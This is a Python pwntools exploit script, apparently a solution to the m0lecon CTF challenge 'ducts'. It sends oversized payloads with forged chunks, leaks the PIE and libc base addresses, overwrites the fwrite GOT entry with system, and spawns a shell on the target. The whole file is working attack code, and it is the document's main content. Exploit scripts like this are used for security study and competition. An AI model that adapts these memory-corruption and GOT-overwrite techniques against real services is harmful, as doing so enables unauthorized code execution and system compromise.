from pwn import *


LIST = 0xDEADBEEF
RESET = 0xDEADC0DE
REDACT = 0xCAFEBABE

HOST = 'localhost'
# HOST = 'ducts.challs.m0lecon.it'


def send_message(p, message):
    p.sendlineafter(b"What do you want to destroy?", message)


def send_name(p, name):
    p.sendlineafter(b"Please leave also your name for recording purposes!", name)


def step_1(p, port):
    p1 = remote(HOST, port)
    p2 = remote(HOST, port)
    p3 = remote(HOST, port)

    fake_chunk = p32(1) + p32(LIST)

    payload = flat({0: b"GOTCHA\x00", 0x1f000: fake_chunk}, length=0x20000, filler=b"A")
    send_message(p1, payload)
    send_message(p2, payload)
    send_message(p3, payload)

    send_name(p1, b"B"*0x20)
    send_name(p2, b"B"*0x20)
    send_name(p3, b"B"*0x20)
    p1.close()
    p2.close()
    p3.close()


def leak_libc(p, port, elf, libc):
    p1 = remote(HOST, port)
    p2 = remote(HOST, port)
    p3 = remote(HOST, port)

    fake_chunk = b""
    fake_chunk += p32(1) + p32(LIST) + b"F"*16

    payload = flat({0: b"GOTCHA\x00", 0x1f000: fake_chunk}, length=0x20000, filler=b"A")
    send_message(p1, payload)
    send_message(p2, payload)
    send_message(p3, payload)

    send_name(p1, b"B"*0x20)
    send_name(p2, b"B"*0x20)
    send_name(p3, b"B"*0x20)
    p1.close()
    p2.close()
    p3.close()

    output = []
    while True:
        line = p.recvline(timeout=10).decode()
        if len(line) == 0:
            break
        if 'GOTCHA' in line:
            output.append(line)

    foo = output[-1].strip().split(' ')
    elf.address = int(foo[8], 16) - 0x4120

    addrs = []
    for x in output:
        addr = x.strip().split(' ')[1]
        if addr.startswith('0x7'):
            addrs.append(int(addr, 16))

    libc.address = sorted(addrs)[0] + 0x44ff0

    log.success(f"Leaked PIE base @ {hex(elf.address)}")
    log.success(f"Leaked libc base @ {hex(libc.address)}")


def exploit(p, port, elf, libc):
    p1 = remote(HOST, port)
    p2 = remote(HOST, port)
    p3 = remote(HOST, port)

    fake_chunk = b""
    # FLUSH MESSAGES
    fake_chunk += p32(1) + p32(RESET) + b"F"*16
    # Add a message
    fake_chunk += p32(0) + p32(4) + p64(elf.got['fwrite']-0x50) + b"X"*0x40 + b"Y"*4
    # Redact message
    fake_chunk += p32(1) + p32(REDACT) + p64(1) + p64(libc.symbols['system'])
    # FLUSH MESSAGES
    fake_chunk += p32(1) + p32(RESET) + b"F"*16
    # Trigger system("/bin/sh")
    fake_chunk += p32(0) + p32(4) + b"H"*8 + b"I"*0x40 + b"sh;\x00"

    payload = flat({0: b"GOTCHA\x00", 0x1f000: fake_chunk}, length=0x20000, filler=b"A")
    send_message(p1, payload)
    send_message(p2, payload)
    send_message(p3, payload)

    send_name(p1, b"B"*0x20)
    send_name(p2, b"B"*0x20)
    send_name(p3, b"B"*0x20)
    p1.close()
    p2.close()
    p3.close()


if __name__ == '__main__':
    p = remote(HOST, 4444)

    elf = ELF("./chal")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    p.recvuntil(b"Port is ")
    port = int(p.recvline().strip().decode())
    step_1(p, port)
    leak_libc(p, port, elf, libc)
    exploit(p, port, elf, libc)
    p.interactive()
